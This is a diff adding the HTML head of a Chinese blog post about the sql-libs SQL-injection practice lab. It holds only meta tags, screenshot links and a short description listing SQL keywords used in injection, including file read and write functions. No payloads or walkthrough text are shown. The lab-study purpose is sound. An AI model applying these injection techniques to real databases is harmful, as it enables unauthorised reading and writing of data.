@@ -1,0 +1,1811 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wuyaxiao.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"posthide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="SQL注入基础知识SQL注入中常用的关键字和系统表和函数sql注入中常用到的sql关键字    表达式 描述    union 将查询结果进行联合输出，追加在列尾   union all    load 文件读取   into outfile 文件写入   @@datadir 数据库文件存放路径   user() 当前用户   version() 数据库版本   database() 数据库名称">
+<meta property="og:type" content="article">
+<meta property="og:title" content="学习小屋">
+<meta property="og:url" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:site_name" content="学习小屋">
+<meta property="og:description" content="SQL注入基础知识SQL注入中常用的关键字和系统表和函数sql注入中常用到的sql关键字    表达式 描述    union 将查询结果进行联合输出，追加在列尾   union all    load 文件读取   into outfile 文件写入   @@datadir 数据库文件存放路径   user() 当前用户   version() 数据库版本   database() 数据库名称">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/%E5%B1%95%E7%A4%BA%E5%88%97%E6%B5%8B%E8%AF%95.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0%E8%8E%B7%E5%8F%96.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-%E8%A1%A8%E5%90%8D%E8%8E%B7%E5%8F%96.png">
+<meta property="og:image" content="https://github.com/AnchoretY/images/blob/master/blog/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-%E8%A1%A8%E4%B8%AD%E5%88%97%E5%90%8D%E8%8E%B7%E5%8F%96.png?raw=true">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/sqlmap%E6%B3%A8%E5%85%A5%E7%82%B9%E6%A3%80%E6%B5%8B2.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/sqlmap%E6%B3%A8%E5%85%A5%E7%82%B9%E6%A3%80%E6%B5%8B.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/sqlmap%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A2%E6%B5%8B2.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/sqlmap%E6%95%B0%E6%8D%AE%E6%8E%A2%E6%B5%8B.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/sqlmap%E6%95%B0%E6%8D%AE%E8%A1%A8%E6%8E%A2%E6%B5%8B2.png">
+<meta property="og:image" content="https://github.com/AnchoretY/images/blob/master/blog/sqlmap%E6%95%B0%E6%8D%AE%E8%A1%A8%E6%8E%A2%E6%B5%8B.png?raw=true">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/sqlmap%E5%AD%97%E6%AE%B5%E6%8E%A2%E6%B5%8B2.png">
+<meta property="og:image" content="https://github.com/AnchoretY/images/blob/master/blog/sqlmap%E5%AD%97%E6%AE%B5%E6%8E%A2%E6%B5%8B.png?raw=true">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/sqlmap%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E6%95%B0%E6%8D%AE%E8%AF%BB%E5%8F%962.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/sqlmap%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E6%95%B0%E6%8D%AE%E8%AF%BB%E5%8F%96.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005114241093.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005123121454.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005123056614.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009163133720.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009143610794.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009145027851.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250929154352407.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250929154453702.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250929154513747.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250929142914221.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250929143018664.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930143737686.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930150943482.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930151154675.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930151444113.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930151638360.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930151903154.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930152131598.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930152328453.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930152345031.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930155429923.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930155502840.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930155548874.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930155709881.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930155807987.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930155909499.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002145450100.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002150048027.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002150218655.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002150342234.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002150430369.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002150526542.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002150738292.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002152800855.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002152818649.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002152912591.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002153858110.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002155006108.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002155117399.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002161150193.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002161200323.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002161211212.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002161432573.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002161401613.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002161515802.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002161623926.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002162646911.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002194431806.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002195833320.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002205633421.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002205649106.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002205618835.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002210028062.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002210041459.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002210236130.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002210308162.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002210640869.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003154512715.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003155037330.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003160027628.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003160041644.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003160447143.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003175242955.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003175251618.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003175538051.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003180718169.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003180642249.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005105514882.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005110705652.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005110753250.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005110839893.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005110915382.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005111605565.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005111653484.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005111733598.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005111808174.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005111832679.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005113525904.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005113615788.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005113648555.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005113726055.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005113810838.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005141225467.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006092335442.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005143223328.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005144346217.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005144355594.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005142244917.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005142426857.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005142511223.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005142547244.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006095815726.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006095033007.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006100924958.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006133532042.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006135937986.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006140635107.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006160247545.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006160305895.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006160331798.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006160357105.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006160526567.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006160708483.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251006161331830.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007110536933.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007110739090.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007110910433.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007141121870.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007143522874.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007143657380.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007143807892.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007143944845.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007144012346.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007144036127.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007152012138.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007152423645.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007152650228.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007152845895.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007152912322.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009102048097.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009102103001.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009111805194.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009111817137.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009113131343.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009113225129.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009113240001.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009113756936.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009115041788.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009115937469.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009120232000.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009145027851.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009145628367.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009145656331.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009150047756.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009150156919.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009160222645.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009162713201.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009163846566.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009164234000.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013113448529.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013113842064.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013114139453.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013114204973.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013114224359.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013114244004.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013114315739.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013114457237.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013114735083.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013114704458.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013115006579.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013115345261.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013115549028.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251014112936917.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251014112956369.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251014115302605.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251014115624240.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251014150235821.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251014150151389.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251014150208037.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251016112250750.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251016112817992.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251016112843743.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251016113737494.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251016165313003.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251016170414331.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251017202612319.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251017203222819.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251018123414165.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251018123653668.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251018130037230.png">
+<meta property="article:published_time" content="2025-09-23T08:24:26.392Z">
+<meta property="article:modified_time" content="2026-07-19T17:30:05.548Z">
+<meta property="article:author" content="wuyaxiao">
+<meta name="twitter:card" content="summary">
